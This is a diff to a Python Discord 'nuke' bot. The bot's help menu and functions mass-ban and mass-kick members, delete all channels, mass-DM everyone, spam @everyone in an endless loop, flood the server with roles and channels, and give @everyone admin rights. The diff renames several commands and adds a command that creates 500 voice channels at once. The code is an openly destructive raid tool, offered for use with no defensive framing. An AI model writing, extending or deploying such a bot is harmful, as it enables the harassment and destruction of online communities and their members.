@@ -40,19 +40,19 @@ async def cmds(ctx):
 
  embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
  
- embed.add_field(name="cmds", value="shows this message.", inline=False)
- embed.add_field(name="nuke", value="nukes the server.", inline=False)
+ embed.add_field(name="cmds", value="Shows this message.", inline=False)
+ embed.add_field(name="nuke", value="Nukes the server.", inline=False)
  embed.add_field(name="nick <nickname>", value="Mass nickname change.", inline=False)
  embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
  embed.add_field(name="spam", value="Spams all channels.", inline=False)
- embed.add_field(name="spam2", value="Spams the channel.", inline=False)
- embed.add_field(name="role", value="Creates a role.", inline=False)
- embed.add_field(name="role2", value="Spams roles.", inline=False)
+ embed.add_field(name="spamchan", value="Spams the channel.", inline=False)
+ embed.add_field(name="roles", value="Spam make roles.", inline=False)
  embed.add_field(name="delete", value="Deletes all channels.", inline=False)
- embed.add_field(name="channels", value="Creates channels.", inline=False)
- embed.add_field(name="kick", value="Kicks everyoner.", inline=False)
- embed.add_field(name="ban", value="Bans all users.", inline=False)
- embed.add_field(name="ban2 <user>", value="Purges Bans specified user..", inline=False)
+ embed.add_field(name="channels", value="Spam creates channels.", inline=False)
+ embed.add_field(name="voicec",value="Spam creates voice channels.", inline=False)
+ embed.add_field(name="kick", value="Kicks everyone below bot role.", inline=False)
+ embed.add_field(name="ban", value="Bans all users below bot role.", inline=False)
+ embed.add_field(name="banuser <user>", value="Bans specified user..", inline=False)
  embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
  embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
  embed.add_field(name="ping",value="Shows bots ping.", inline=False)
@@ -72,7 +72,7 @@ async def nick(ctx, rename_to):
         print ("Action Completed: change nick")
 
 @bot.command(pass_context=True)
-async def ban2(ctx, member : discord.Member):
+async def banuser(ctx, member : discord.Member):
     await member.ban()
     await ctx.message.delete()
 
@@ -141,11 +141,11 @@ async def roles(ctx):
 
 
 @bot.command(pass_context=True)
-async def spam2(ctx): 
+async def spamchan(ctx): 
     await ctx.message.delete()
     while True:
     
-     await ctx.send("@everyone") 
+     await ctx.send("@everyone Sample Text") 
 
 @bot.command(pass_context=True)
 async def spam(ctx, amount=1000000):
@@ -226,5 +226,12 @@ async def channels(ctx, amount=500):
     guild = ctx.message.guild 
     for i in range(amount):
         await guild.create_text_channel(random.choice(CHANNEL_NAMES))
+
+@bot.command(pass_context=True)
+async def voicec(ctx, amount=500):
+    await ctx.message.delete()
+    guild = ctx.message.guild 
+    for i in range(amount):
+        await guild.create_voice_channel(random.choice(CHANNEL_NAMES))
 
 bot.run(Bot Token Here)
